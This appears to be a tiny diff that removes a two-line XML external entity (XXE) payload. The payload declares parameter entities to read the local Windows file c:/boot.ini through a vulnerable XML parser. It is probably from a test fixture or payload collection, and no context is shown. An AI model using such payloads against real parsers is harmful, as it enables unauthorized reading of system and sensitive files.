@@ -1,2 +1,0 @@
-<!ENTITY % payload SYSTEM "file:///c:/boot.ini">
-<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
